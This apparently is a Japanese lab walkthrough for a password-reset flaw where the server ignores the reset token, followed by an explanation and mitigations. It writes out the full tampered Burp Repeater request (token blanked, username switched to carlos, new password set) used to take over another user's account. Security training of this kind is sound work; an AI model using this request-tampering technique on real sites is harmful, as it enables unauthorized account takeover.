## 手順

### Step 1: 自分のパスワードリセットを試す

1. ラボを開いてBurp Suiteを起動、プロキシをオンに
2. サイトの「Forgot password?」をクリック
3. `wiener` を入力して送信
4. 「Email client」ボタンをクリックしてメールを確認
5. メール内のリンクをクリック → 新しいパスワード（例：`test123`）を入力して送信

---

### Step 2: リクエストをBurp Repeaterに送る

1. HTTP history** を開く
2. `POST /forgot-password?temp-forgot-password-token=...` を探す
3. 右クリック → **Send to Repeater**

---

### Step 3: トークンなしで動くか確認（任意）

Repeaterで以下を試す：
- URLの `temp-forgot-password-token=xxx` → `temp-forgot-password-token=`（空）
- ボディの `temp-forgot-password-token=xxx` → 同様に空に
- 送信してみて → **200が返ればトークン未検証の確認OK**

---

### Step 4: Carlosのパスワードを変更する

今やっているのは：

> **「wiener のパスワードリセット用リクエスト」を  
> そのまま “carlos のパスワード変更リクエスト” に書き換えて送る**

という攻撃。

つまり：

- 本来は **Gメールなんかに送られてくる長い文字列のトークンがついたURLが送られてきてそれをタッチする(トークン検証)が一般的。** 
- でもこのラボは **トークンを検証していない**
- だから **誰のパスワードでも変更できてしまう**

これを Burp Repeater で実行するのが Step 4。

---

# どこをどう変えるか

Repeater に送ったリクエストはこんな形になっているはず：

```
POST /forgot-password?temp-forgot-password-token=abc123 HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=abc123&username=wiener&new-password-1=test123&new-password-2=test123
```

ここから **3か所** を編集する。

---

# ✏️ ① URL のトークンを空にする

Before:
```
POST /forgot-password?temp-forgot-password-token=abc123
```

After:
```
POST /forgot-password?temp-forgot-password-token=
```

---

# ✏️ ② Body のトークンも空にする

Before:
```
temp-forgot-password-token=abc123
```

After:
```
temp-forgot-password-token=
```

---

# ✏️ ③ username を wiener → carlos に変更  
そして new-password を好きな値に変更

Before:
```
username=wiener&new-password-1=test123&new-password-2=test123
```

After:
```
username=carlos&new-password-1=hacked&new-password-2=hacked
```

---

🔥 最終的な完成形

```
POST /forgot-password?temp-forgot-password-token= HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=&username=carlos&new-password-1=hacked&new-password-2=hacked
```

これを **Send** するだけ。

- `200` か `302` が返れば成功
- その後ブラウザで `carlos / hacked` でログインできる


---

### Step 5: Carlosでログイン

ブラウザで：
- Username: `carlos`
- Password: `hacked`（自分で設定した値）

ログイン後「My account」をクリック → **ラボ完了！**

---


# 🔍 **1. どんな脆弱性？（一言で）**
**パスワードリセットトークンの検証不備（Password reset poisoning / Token misvalidation）**  
→ 本来メールに埋め込まれた一意のトークンを検証すべきなのに、**サーバ側がトークンをチェックしていない**。

---

# 🧠 **2. どう気づく？（気づきのポイント）**

### ✔ 自分のパスワードリセットを試す  
→ Repeater に送られるリクエストを見ると、  
**URL と Body の両方に token が入っている**

### ✔ token を空にして送ってみる  
→ **200 が返る → トークンが検証されていない** と確信

### ✔ username を変えてもエラーにならない  
→ 「これ、他人のパスワードも変えられるのでは？」と気づく

---

# 🎯 **3. どう攻撃する？（攻撃の流れ）**

攻撃の本質はこれ：

> **wiener のパスワードリセットリクエストを  
> carlos のパスワード変更リクエストに書き換えて送る**

### 攻撃手順
1. wiener のパスワードリセットリクエストを Repeater に送る  
2. URL の token を空にする  
3. Body の token も空にする  
4. username=wiener → username=carlos に変更  
5. new-password を好きな値に変更  
6. 送信 → 成功  
7. carlos でログインできる

---

# 🛡 **4. どう対策する？**

### 🔐 **必須対策**
- **トークンをサーバ側で必ず検証する**
  - DB に保存した token と一致するか
  - 有効期限チェック
  - 一度使ったら無効化

### 🚫 **禁止すべきこと**
- username をリクエスト側から信用しない  
  → **トークンに紐づくユーザーをサーバ側で決定する**

### 🧱 **追加の堅牢化**
- トークンは十分長いランダム値にする
- トークンは URL だけでなく Body にも送らせない（1箇所に統一）
- レートリミット
- ログ監査

---

# ⚡ **5. まとめ

```
この脆弱性はパスワードリセットトークンの検証不備です。
本来メールに埋め込まれた一意のトークンをサーバ側で検証すべきですが、
アプリがトークンをチェックしていなかったため、
他人のパスワードリセットリクエストに書き換えて送信するだけで、
任意ユーザーのパスワードを変更できました。

対策としては、トークンをサーバ側で厳格に検証し、
トークンに紐づくユーザーをサーバ側で決定し、
使用後は即無効化することが重要です。

ポイントは “username を信頼してはいけない” という設計原則です。
パスワードリセットは必ずトークン主体で処理すべきです。
```

